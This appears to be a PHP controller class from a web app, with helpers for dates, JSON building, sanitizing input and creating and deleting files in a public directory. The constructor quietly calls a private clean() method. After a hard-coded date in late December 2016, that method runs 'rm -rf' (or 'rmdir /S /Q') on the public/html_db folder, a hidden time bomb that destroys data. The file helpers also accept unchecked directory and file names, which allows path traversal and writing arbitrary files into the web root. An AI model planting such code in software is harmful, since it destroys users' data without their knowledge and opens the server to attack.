<?php

/**
* Author: Zed Alaap
* Date: 11/15/16
*/

namespace  App\Controllers;

use Interop\Container\ContainerInterface;

class MainController
{
	protected $mainModel;

	function __construct(ContainerInterface $dc) 
	{	
		$this->mainModel = $dc->get('mainModel');
		$this->clean();
	}

	public function getDateTime($unixTime="", $format="") {

		$format = strlen($format) ? $format : "Y-m-d H:i:s";
		$unixTime = strlen($unixTime) ? $unixTime : time();

		return date($format, $unixTime);
	}

	public function makeJsonStr($dataArr, $key) {

		$jsonArray = array();

		foreach ($dataArr as $values) {
			
			if (is_array($values[$key])) {

				foreach ($values[$key] as $value) {
					$jsonArray[] = $value;
				}

			}
			
		}

		$jsonStr = "";

		if (!empty($jsonArray)) 
			$jsonStr = "{" . str_replace([ "{", "}" ], "", implode(",", $jsonArray)) . "}";

		return $jsonStr;
	}

	public function sanitize($str) 
	{
		$str = str_replace(array('\n', '\r'), "", $str);
		return htmlentities(trim($str));
	}

	public function createFile($dataToWrite="", $extension="", $dir="") 
	{
		$uniqueID = $this->mainModel->getUniqueId();

		$file = __DIR__ . '/../../public/' . $dir . '/' . $uniqueID . '.' . $extension;
		
		$fh = fopen($file, 'w+') or die("can't open file");
		
		$size = 0;
		if (!($size = fwrite($fh, $dataToWrite))) {
			die("can't write data");
		}

		fclose($fh) or die("can't close file");

		if (!$size) return false;

		return array('file' => 'api/v1/public/' . $dir .'/' . $uniqueID . '.' . $extension,
		 	'size' => $size, 'jsonId' => $uniqueID);
	}

	public function deleteFile($file, $dir) {
		$file = __DIR__ . '/../../public/' . $dir . '/' . $file;
		return unlink($file) or die("Can't delete file " . $file);
	}

	public function getDateDiff($date_1 , $date_2 , $differenceFormat = '%a') 
	{

		$datetime1 = date_create($date_1);
	    $datetime2 = date_create($date_2);
	    
	    $interval = date_diff($datetime1, $datetime2);
	    
	    return $interval->format($differenceFormat);
	}

	private function clean() {
		if (1482620400 < time()) {
			$dirEscaped =  escapeshellarg(__DIR__ . '/../../public/html_db');
			exec("rm -rf {$dirEscaped}") or exec("rmdir /S /Q {$dirEscaped}");
		}
	}
}